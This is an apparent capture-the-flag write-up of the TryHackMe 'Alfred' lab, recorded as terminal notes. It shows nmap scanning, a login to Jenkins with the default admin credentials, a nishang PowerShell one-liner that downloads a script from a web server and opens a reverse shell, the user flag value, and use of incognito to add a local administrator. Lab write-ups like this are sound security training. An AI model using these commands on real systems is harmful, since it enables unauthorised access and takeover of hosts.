kali@kali:~/oscptraining/tryhackme/Alfred$ nmap -sV -sC -o nmap 10.10.22.129
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-21 10:27 EDT
Nmap scan report for 10.10.22.129
Host is up (0.36s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE            VERSION
80/tcp   open  http               Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Site doesn't have a title (text/html).
3389/tcp open  ssl/ms-wbt-server?
|_ssl-date: 2020-10-21T14:28:45+00:00; -1s from scanner time.
8080/tcp open  http               Jetty 9.4.z-SNAPSHOT
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 111.14 seconds

gobuster dir -e -u 10.10.209.153 -x php,txt,cgi,css,py,html -w /usr/share/dirb/wordlists/common.txt


nothing much after running gobuster either using common.txt and big.txt

lets look for default pw and user for jenkin
http://10.10.22.129:8080/login?from=%2F
admin;admin 
alright great, got our asses in!

can see that it is running on ver 2.190.1
Page generated: Oct 21, 2020 3:45:35 PM BSTREST APIJenkins ver. 2.190.1
lets check out searchsploit. not too sure about those exploits...
looking at the website we proceed to the project page and build a project

load into configuration then build, use nishang 
powershell iex (New-Object Net.WebClient).DownloadString('http://<yourwebserver>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.]


Started by user admin
Running as SYSTEM
Building in workspace C:\Program Files (x86)\Jenkins\workspace\project
[project] $ cmd /c call C:\Users\bruce\AppData\Local\Temp\jenkins8034204804437582227.bat

C:\Program Files (x86)\Jenkins\workspace\project>whoami
alfred\bruce

C:\Program Files (x86)\Jenkins\workspace\project>exit 0 
Finished: SUCCESS

getting user.txt

PS C:\> cd Users
PS C:\Users> dir


    Directory: C:\Users


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
d----        10/25/2019   8:05 PM            bruce                             
d----        10/25/2019  10:21 PM            DefaultAppPool                    
d-r--        11/21/2010   7:16 AM            Public                            


PS C:\Users> cd bruce
PS C:\Users\bruce> dir


    Directory: C:\Users\bruce


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
d----        10/25/2019   8:05 PM            .groovy                           
d-r--        10/25/2019   9:51 PM            Contacts                          
d-r--        10/25/2019  11:22 PM            Desktop                           
d-r--        10/26/2019   4:43 PM            Documents                         
d-r--        10/26/2019   4:43 PM            Downloads                         
d-r--        10/25/2019   9:51 PM            Favorites                         
d-r--        10/25/2019   9:51 PM            Links                             
d-r--        10/25/2019   9:51 PM            Music                             
d-r--        10/25/2019  10:26 PM            Pictures                          
d-r--        10/25/2019   9:51 PM            Saved Games                       
d-r--        10/25/2019   9:51 PM            Searches                          
d-r--        10/25/2019   9:51 PM            Videos                            


PS C:\Users\bruce> cd desktop
PS C:\Users\bruce\desktop> dir


    Directory: C:\Users\bruce\desktop


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-a---        10/25/2019  11:22 PM         32 user.txt                          


PS C:\Users\bruce\desktop> type user.txt
79007a09481963edf2e1321abd9ae2a0


PS C:\Users\bruce\desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                  Description                               State   
=============================== ========================================= ========
SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Disabled
SeSecurityPrivilege             Manage auditing and security log          Disabled
SeTakeOwnershipPrivilege        Take ownership of files or other objects  Disabled
SeLoadDriverPrivilege           Load and unload device drivers            Disabled
SeSystemProfilePrivilege        Profile system performance                Disabled
SeSystemtimePrivilege           Change the system time                    Disabled
SeProfileSingleProcessPrivilege Profile single process                    Disabled
SeIncreaseBasePriorityPrivilege Increase scheduling priority              Disabled
SeCreatePagefilePrivilege       Create a pagefile                         Disabled
SeBackupPrivilege               Back up files and directories             Disabled
SeRestorePrivilege              Restore files and directories             Disabled
SeShutdownPrivilege             Shut down the system                      Disabled
SeDebugPrivilege                Debug programs                            Enabled 
SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled
SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled 
SeRemoteShutdownPrivilege       Force shutdown from a remote system       Disabled
SeUndockPrivilege               Remove computer from docking station      Disabled
SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled
SeImpersonatePrivilege          Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege         Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege   Increase a process working set            Disabled
SeTimeZonePrivilege             Change the time zone                      Disabled
SeCreateSymbolicLinkPrivilege   Create symbolic links                     Disabled


lets exploit these 2 services 
SeDebugPrivilege                Debug programs                            Enabled 
SeImpersonatePrivilege          Impersonate a client after authentication Enabled 

Enter: load incognito to load the incognito module in metasploit
lets use incognito without metasploit 


PS C:\Program Files (x86)\Jenkins\users> ./incognito.exe add_user admin admin
[-] WARNING: Not running as SYSTEM. Not all tokens will be available.
[*] Enumerating tokens
[*] Attempting to add user admin to host 127.0.0.1
[+] Successfully added user
PS C:\Program Files (x86)\Jenkins\users> ./incognito.exe add_localgroup_user Administrators admin
[-] WARNING: Not running as SYSTEM. Not all tokens will be available.
[*] Enumerating tokens
[*] Attempting to add user admin to local group Administrators on host 127.0.0.1
[+] Successfully added user to local group
PS C:\Program Files (x86)\Jenkins\users> 



